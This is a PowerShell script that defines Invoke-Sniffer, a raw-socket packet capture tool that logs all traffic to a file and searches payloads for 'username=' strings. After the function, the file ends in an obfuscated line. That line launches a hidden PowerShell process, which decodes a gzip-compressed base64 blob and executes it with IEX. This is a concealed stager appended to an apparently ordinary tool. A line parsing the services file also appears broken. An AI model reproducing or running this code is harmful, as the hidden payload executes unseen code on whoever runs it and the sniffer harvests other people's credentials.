function Invoke-Sniffer
{


param( [String]$LocalIP = "NotSpecified", [String]$ScanIP="all", [String]$Protocol = "all", `
		[String]$Port="all", [Int]$Seconds = 0, [switch]$ResolveHosts, [switch]$Help, [String]$OutputFile, $MaxSize)


if( $Help )
{
	Write-Output "usage: $($MyInvocation.MYCommand) [-OutputFile <String>] [-LocalIP <String>] [-ScanIP <String>] [-Protocol <String>] [-Port <String>] [-Seconds <Int32>] [-ResolveHosts]"
	exit -1
}


if (!$OutputFile){
    if (!(Test-Path -Path C:\Temp)) 
    {
        New-Item C:\Temp -type directory
    }
    $OutputFile = "C:\Temp\Dump.txt"
}

if (!$MaxSize)
{
    $MaxSize = 100MB
}

$starttime = Get-Date
$byteIn = New-Object Byte[] 4			
$byteOut = New-Object Byte[] 4			
$byteData = New-Object Byte[] 4096		

$byteIn[0] = 1  						
$byteIn[1-3] = 0
$byteOut[0-3] = 0


$TCPFIN = [Byte]0x01
$TCPSYN = [Byte]0x02
$TCPRST = [Byte]0x04
$TCPPSH = [Byte]0x08
$TCPACK = [Byte]0x10
$TCPURG = [Byte]0x20



Function NetworkToHostUInt16( $address )
{
	[Array]::Reverse( $address )
	return [BitConverter]::ToUInt16( $address, 0 )
}


Function NetworkToHostUInt32( $address )
{
	[Array]::Reverse( $address )
	return [BitConverter]::ToUInt32( $address, 0 )
}


Function ByteToString( $address )
{
	$AsciiEncoding = New-Object System.Text.ASCIIEncoding
	return $AsciiEncoding.GetString( $address )
}



$hosts = @{} 							
Function resolve( $IPAddress )
{
	if( $data = $hosts."$($IPAddress.IPAddressToString)" )
	{
		if( $IPAddress.IPAddressToString -eq $data )
		{
			return [System.Net.IPAddress]$IPAddress
		}
		else
		{
			return $data
		}
	}
	else
	{	
		$null,$null,$null,$data = nslookup $IPAddress.IPAddressToString 2>$null
		$data = $data -match "Name:"
		if( $data -match "Name:" )
		{
			$data = $data[0] -replace "Name:\s+",""
			$hosts."$($IPAddress.IPAddressToString)" = "$data"
			return $data
		}
		else
		{
			$hosts."$($IPAddress.IPAddressToString)" = "$($IPAddress.IPAddressToString)"
			return $IPAddress
		}
	}
}



$servicesFilePath = "$env:windir\System32\drivers\etc\services"            

$serviceFile = [IO.File]::ReadAllText("$env:windir\System32\drivers\etc\services") -split

([Environment]::NewLine) -notlike "


Function getService( $port )
{
	$protocols = foreach( $line in $serviceFile )
	{            
		
		if( -not $line )	{ continue }

		
		$serviceName, $portAndProtocol, $aliasesAndComments = $line.Split(' ', [StringSplitOptions]'RemoveEmptyEntries')
		
		$portNumber, $protocolName = $portAndProtocol.Split("/")            

		if( $portNumber -eq $port )
		{
			return $serviceName
		}
	}
}



if( $LocalIP -eq "NotSpecified" )
{
	route print 0* |
	%{ 
		if( $_ -match "\s{2,}0\.0\.0\.0" )
		{ 
			$null,$null,$null,$LocalIP,$null = [regex]::replace($_.trimstart(" "),"\s{2,}",",").split(",")
		}
	}
}
Write-Output "Local IP: $LocalIP" | Out-File $outputfile -Append
Write-Output "ProcessID: $PID" | Out-File $outputfile -Append
Write-Output "" | Out-File $outputfile -Append



$Socket = New-Object System.Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::IP )

$Socket.SetSocketOption( "IP", "HeaderIncluded", $true )

$Socket.ReceiveBufferSize = 1024000

$Endpoint = New-Object System.Net.IPEndpoint( [Net.IPAddress]"$LocalIP", 0 )
$Socket.Bind( $Endpoint )

[void]$Socket.IOControl( [Net.Sockets.IOControlCode]::ReceiveAll, $byteIn, $byteOut )

Write-Output "Press ESC to stop the packet sniffer ..." | Out-File $outputfile -Append
Write-Output "" | Out-File $outputfile -Append
$escKey = 27
$running = $true



$packets = @()							
while( $running )
{
	
	if( $host.ui.RawUi.KeyAvailable )
	{
		$key = $host.ui.RawUI.ReadKey( "NoEcho,IncludeKeyUp,IncludeKeyDown" )
		
		if( $key.VirtualKeyCode -eq $ESCkey )
		{
			$running = $false
		}
	}
	
	if( $Seconds -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Seconds)) )
	{
		exit
	}
	
	if( -not $Socket.Available )
	{
		start-sleep -milliseconds 300
		continue
	}
	
	
	$rData = $Socket.Receive( $byteData, 0, $byteData.length, [Net.Sockets.SocketFlags]::None )
	
	$MemoryStream = New-Object System.IO.MemoryStream( $byteData, 0, $rData )
	$BinaryReader = New-Object System.IO.BinaryReader( $MemoryStream )

	
	$VerHL = $BinaryReader.ReadByte( )
	
	$TOS= $BinaryReader.ReadByte( )
	
	$Length = NetworkToHostUInt16 $BinaryReader.ReadBytes( 2 )
	
	$Ident = NetworkToHostUInt16 $BinaryReader.ReadBytes( 2 )
	
	$FlagsOff = NetworkToHostUInt16 $BinaryReader.ReadBytes( 2 )
	
	$TTL = $BinaryReader.ReadByte( )
	
	$ProtocolNumber = $BinaryReader.ReadByte( )
	
	$Checksum = [Net.IPAddress]::NetworkToHostOrder( $BinaryReader.ReadInt16() )
	
	$SourceIP = $BinaryReader.ReadUInt32( )
	$SourceIP = [System.Net.IPAddress]$SourceIP
	
	$DestinationIP = $BinaryReader.ReadUInt32( )
	$DestinationIP = [System.Net.IPAddress]$DestinationIP

	
	$ipVersion = [int]"0x$(('{0:X}' -f $VerHL)[0])"
	
	$HeaderLength = [int]"0x$(('{0:X}' -f $VerHL)[1])" * 4

	
	if($HeaderLength -gt 20)
	{
		[void]$BinaryReader.ReadBytes( $HeaderLength - 20 )  
	}
	
	$Data = ""
	$TCPFlagsString = @()  				
	$TCPWindow = ""
	$SequenceNumber = ""
	
	switch( $ProtocolNumber )
	{
		1 {  
			$ProtocolDesc = "ICMP"
			$sourcePort = [uint16]0
			$destPort = [uint16]0
			$ICMPType = $BinaryReader.ReadByte()
			$ICMPCode = $BinaryReader.ReadByte()
			switch( $ICMPType )
			{
				0	{	$ICMPTypeDesc = "Echo reply"; break }
				3	{	$ICMPTypeDesc = "Destination unreachable"
						switch( $ICMPCode )
						{
							0	{	$ICMPCodeDesc = "Network not reachable"; break }
							1	{	$ICMPCodeDesc = "Host not reachable"; break }
							2	{	$ICMPCodeDesc = "Protocol not reachable"; break }
							3	{	$ICMPCodeDesc = "Port not reachable"; break }
							4	{	$ICMPCodeDesc = "Fragmentation needed"; break }
							5	{	$ICMPCodeDesc = "Route not possible"; break }
							13	{	$ICMPCodeDesc = "Administratively not possible"; break }
							default	{	$ICMPCodeDesc = "Other ($_)" }
						}
						break
				}
				4	{	$ICMPTypeDesc = "Source quench"; break }
				5	{	$ICMPTypeDesc = "Redirect"; break }
				8	{	$ICMPTypeDesc = "Echo request"; break }
				9	{	$ICMPTypeDesc = "Router advertisement"; break }
				10	{	$ICMPTypeDesc = "Router solicitation"; break }
				11	{	$ICMPTypeDesc = "Time exceeded"
						switch( $ICMPCode )
						{
							0	{	$ICMPCodeDesc = "TTL exceeded"; break }
							1	{	$ICMPCodeDesc = "While fragmenting exceeded"; break }
							default	{	$ICMPCodeDesc = "Other ($_)" }
						}
						break
				}
				12	{	$ICMPTypeDesc = "Parameter problem"; break }
				13	{	$ICMPTypeDesc = "Timestamp"; break }
				14	{	$ICMPTypeDesc = "Timestamp reply"; break }
				15	{	$ICMPTypeDesc = "Information request"; break }
				16	{	$ICMPTypeDesc = "Information reply"; break }
				17	{	$ICMPTypeDesc = "Address mask request"; break }
				18	{	$ICMPTypeDesc = "Address mask reply"; break }
				30	{	$ICMPTypeDesc = "Traceroute"; break }
				31	{	$ICMPTypeDesc = "Datagram conversion error"; break }
				32	{	$ICMPTypeDesc = "Mobile host redirect"; break }
				33	{	$ICMPTypeDesc = "Where-are-you"; break }
				34	{	$ICMPTypeDesc = "I-am-here"; break }
				35	{	$ICMPTypeDesc = "Mobile registration request"; break }
				36	{	$ICMPTypeDesc = "Mobile registration reply"; break }
				37	{	$ICMPTypeDesc = "Domain name request"; break }
				38	{	$ICMPTypeDesc = "Domain name reply"; break }
				39	{	$ICMPTypeDesc = "SKIP"; break }
				40	{	$ICMPTypeDesc = "Photuris"; break }
				41	{	$ICMPTypeDesc = "Experimental mobility protocol"; break }
				default	{	$ICMPTypeDesc = "Other ($_)" }
			}
			$ICMPChecksum = [System.Net.IPAddress]::NetworkToHostOrder($BinaryReader.ReadInt16())
			$Data = ByteToString $BinaryReader.ReadBytes($Length - ($HeaderLength - 32))
			break
			}
		2 {  
			$ProtocolDesc = "IGMP"
			$sourcePort = [uint16]0
			$destPort = [uint16]0
			$IGMPType = $BinaryReader.ReadByte()
			$IGMPMaxRespTime = $BinaryReader.ReadByte()
			$IGMPChecksum = [System.Net.IPAddress]::NetworkToHostOrder($BinaryReader.ReadInt16())
			$Data = ByteToString $BinaryReader.ReadBytes($Length - ($HeaderLength - 32))
			break
			}
		6 {  
			$ProtocolDesc = "TCP"
			$sourcePort = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
			$destPort = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
			$serviceDesc = getService( $destPort )
			$SequenceNumber = NetworkToHostUInt32 $BinaryReader.ReadBytes(4)
			$AckNumber = NetworkToHostUInt32 $BinaryReader.ReadBytes(4)
			$TCPHeaderLength = [int]"0x$(('{0:X}' -f $BinaryReader.ReadByte())[0])" * 4
			$TCPFlags = $BinaryReader.ReadByte()
			switch( $TCPFlags )
			{
				{ $_ -band $TCPFIN }	{ $TCPFlagsString += "<FIN>" }
				{ $_ -band $TCPSYN }	{ $TCPFlagsString += "<SYN>" }
				{ $_ -band $TCPRST }	{ $TCPFlagsString += "<RST>" }
				{ $_ -band $TCPPSH }	{ $TCPFlagsString += "<PSH>" }
				{ $_ -band $TCPACK }	{ $TCPFlagsString += "<ACK>" }
				{ $_ -band $TCPURG }	{ $TCPFlagsString += "<URG>" }
			}
			$TCPWindow = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
			$TCPChecksum = [System.Net.IPAddress]::NetworkToHostOrder($BinaryReader.ReadInt16())
			$TCPUrgentPointer = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
			if( $TCPHeaderLength -gt 20 )  
			{
				[void]$BinaryReader.ReadBytes($TCPHeaderLength - 20)
			}
			
			if ($TCPFlags -band $TCPSYN)
			{
				$ISN = $SequenceNumber
				
				[void]$BinaryReader.ReadBytes(1)
			}
			$Data = ByteToString $BinaryReader.ReadBytes($Length - ($HeaderLength + $TCPHeaderLength))
			break
			}
		17 {  
			$ProtocolDesc = "UDP"
			$sourcePort = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
			$destPort = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
			$serviceDesc = getService( $destPort )
			$UDPLength = NetworkToHostUInt16 $BinaryReader.ReadBytes(2)
			[void]$BinaryReader.ReadBytes(2)
			
			$Data = ByteToString $BinaryReader.ReadBytes(($UDPLength - 2) * 4)
			break
			}
		default {
			$ProtocolDesc = "Other ($_)"
			$sourcePort = 0
			$destPort = 0
			}
	}
	
	$BinaryReader.Close( )
	$memorystream.Close( )
	$Data = $Data.toCharArray( 0, $Data.length )

	
	if( $ResolveHosts )
	{
		
		$DestinationHostName = resolve( $DestinationIP )
		
		$SourceHostName = resolve( $SourceIP )
	}

	if( ($Protocol -eq "all") -or ($Protocol -eq $ProtocolDesc) )
	{
		if( ($Port -eq "all") -or ($Port -eq $sourcePort) -or ($Port -eq $destPort) )
		{
			if( ($ScanIP -eq "all") -or ($ScanIP -eq $SourceIp) -or ($ScanIP -eq $DestinationIP) )
			
			{
                if ((get-item $outputfile).length -gt $MaxSize)
                {
                    $running = $false
                }
				Write-Output "Time:`t`t$(get-date)" | Out-File $outputfile -Append
				Write-Output "Version:`t$ipVersion`t`t`tProtocol:`t$ProtocolNumber = $ProtocolDesc" | Out-File $outputfile -Append
				Write-Output "Destination:`t$DestinationIP`t`tSource:`t`t$SourceIP" | Out-File $outputfile -Append
				if( $ResolveHosts )
				{
					Write-Output "DestinationHostName`t$DestinationHostName`tSourceHostName`t$SourceHostName" | Out-File $outputfile -Append
				}
				Write-Output "DestPort:`t$destPort`t`t`tSourcePort:`t$sourcePort" | Out-File $outputfile -Append
				switch( $ProtocolDesc )
				{
					"ICMP"	{
							Write-Output "Type:`t`t$ICMPType`t`t`tDescription:`t$ICMPTypeDesc" | Out-File $outputfile -Append
							Write-Output "Code:`t`t$ICMPCode`t`t`tDescription:`t$ICMPCodeDesc" | Out-File $outputfile -Append
							break
						}
					"IGMP"	{
							Write-Output "Type:`t`t$IGMPType`t`t`tMaxRespTime:`t$($IGMPMaxRespTime*100)ms" | Out-File $outputfile -Append
							break
						}
					"TCP"	{
							Write-Output "Sequence:`t$SequenceNumber`t`tAckNumber:`t$AckNumber" | Out-File $outputfile -Append
							Write-Output "Window:`t`t$TCPWindow`t`t`tFlags:`t`t$TCPFlagsString" | Out-File $outputfile -Append
							Write-Output "Service:`t$serviceDesc" | Out-File $outputfile -Append
							break
						}
					"UDP"	{
							Write-Output "Service:`t$serviceDesc" | Out-File $outputfile -Append
							break
						}
				}
				for( $index = 0; $index -lt $Data.length; $index++ )
				{
					
					if( $Data[$index] -lt 33 -or $Data[$index] -gt 126 )
					{
						$Data[$index] = '.'
					}
				}
				$OFS=""	
				Write-Output "Data: $Data" | Out-File $outputfile -Append
                "Data: $Data" |select-string -Pattern "username="
				Write-Output "----------------------------------------------------------------------" | Out-File $outputfile -Append


			}
		}
	}
}

}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIV0GFgCA7VWbW/aSBD+3Er9D1aFhK0SbAht0kiVbm1jIAECcTABDlWLvTYbFi+11+Gl1/9+Y7Abck1OqU5ngby7M7Mz+8wzO/aT0BWUh9JmXllL39+9fdPDEV5KcoF+pQujU5IK815wPqufa0bjmihv3oBKIRiHrQ6XvkjyBK1WJl9iGk4vLowkikgoDvNygwgUx2Q5Y5TEsiL9JQ3nJCIn17N74grpu1T4Wm4wPsMsU9sa2J0T6QSFXiprcxenoZXtFaNCLv75Z1GZnFSm5fq3BLNYLtrbWJBl2WOsqEg/lNTh7XZF5GKHuhGPuS/KQxqeVsuDMMY+6cJuD6RDxJx7cVGBc8AvIiKJQik7UbrFQUEuwrAXcRd5XkRi0C+3wge+IHIhTBgrSX/Ik8z/TRIKuiQgFyTiK5tED9QlcbmJQ4+RG+JP5S5Z58d+rZF8bARaPREpJUjLs4F2uJcwcrAtKr+GmiVTgeefCQUcfrx7++6tnxOBR7Zpd6l7TAYYvZnsxwTClXs8pnvdL5JWkjrgFgsebWFauI0SokylSZqIyXQqFdiwG1un9rrufm2WXt6nkhuBySzxtpdn12tYnjicelMwy9JVoNXAql81de86lb5MPpP4NCTmNsRL6ub8kp9LBPEZ2Z+8nKt1ITy5mAmIZxJGAixSYEvS5Fez+pKKn7Z6QplHIuRCMmOICvKsPA3mkCu52Ao7ZAmoHeZFyIsPrCa5dsbkbe49nYNS0WA4jktSL4GyckuSTTAjXklCYUwzEUoE3w+Lj+F2Eiaoi2ORbzdVnqKZeTV4GIsocSGdgMCtvSIuxSwFpCQ1qUf0rU2D3HvxWTgMzBgNA9jpAdIBKykMtkhJEkGgTwihlG0iWssVI0vQ3Ve7xXAAtZ3Vx55dOCBe8fl48xo4ED7FJwfmKFpIus24KEkOjQRcHSnWOcf+W0BHF8hRaEZEsoTJeXVN9K1I66GwG38KG5oeGZWUvxl6e6wiAThZEV/qOCafaraIAEX5vXpNDQTPqBWyjqsvaAWtaaXVgf+Anra4eeZdXd431cjczH3UiludZs/sN5u1h0vbqQm73hJXvZbo1O/u723UvBmMxLiFmrdUW4xqu9Ul3dlt5I026qedvltr+mZ3H3j+yPT94My3byofLdoeGn1dq+K2WU/aQ32ta7W4TtfNPh30F5eWmI0chge+GtxVPmO6aUf3ToV3di2EGvNTd3fpO415x9uOmurnYW2B6ggZYd2xdH410iPUUx0cOHx9FehxNTCQbrmUjPsDS+/3LR0NGvffzM9qALZ3eK4PnSodr+5u5jC3IIQrVau1PLLjoz6A1OAIBzegExhVd+6DjvkB6R+6PK7ihc6RDjrW+BvENVpZPQby20GVI4d17zBqj7eWqlZGvRpqanTYCFC6JQ70Pkbxg7kz1YrjcW/4sTvyVeeOnammcbtyfVVV103zyh1XNufXZ+ftIXWWHA1U1XmfcgRIUgjdO2s2O8r4S9d/B0fxHDNgAtzqea1aPLKy27nHaWohy/t2vSBRSBg0OGiBObkRY9xNO8XPexw61aF/TKFeBzA8rT47UqSfispjD8mXLi7GECmUyyODy20SBmJe0janmgaNQNvUNDjx689o8NVWPtqwlLaTDKynntjek5KWUmF5kzygna5tsfP/IprV8Rxe3msQfVz7F+mrUNZKOQq/CJ4u/Bbcvw3AEFMBmjZcRIwc2ubLOGQkOvr6OEoUcMTPnvRD8DoRJ134NvkbGiiTnH4KAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

